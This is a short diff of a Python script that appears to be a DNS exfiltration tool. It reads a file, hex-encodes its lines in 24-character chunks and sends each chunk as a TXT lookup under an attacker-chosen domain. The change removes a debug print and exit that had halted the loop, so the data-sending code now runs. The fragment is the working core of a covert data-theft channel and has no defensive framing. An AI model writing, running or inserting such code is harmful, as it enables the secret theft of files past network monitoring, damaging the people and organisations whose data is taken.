@@ -21,8 +21,6 @@ with open (args.file,"r") as work_file:
 		for piece in break_line(line.rstrip(),24):
 			#string = ("%s\t%s\n"%(str(num).rjust(5,'0'),piece))
 			string = ("%s\t%s\n"%(f'{num:05}',piece))
-			print(string)
-			exit()
 			encoded_string = binascii.hexlify(string.encode('utf-8')) 
 			tld = ("d.%s.%s.%s"%(encoded_string.decode('utf-8'),nonce,args.domain))
 			dns.resolver.query(tld,'TXT')
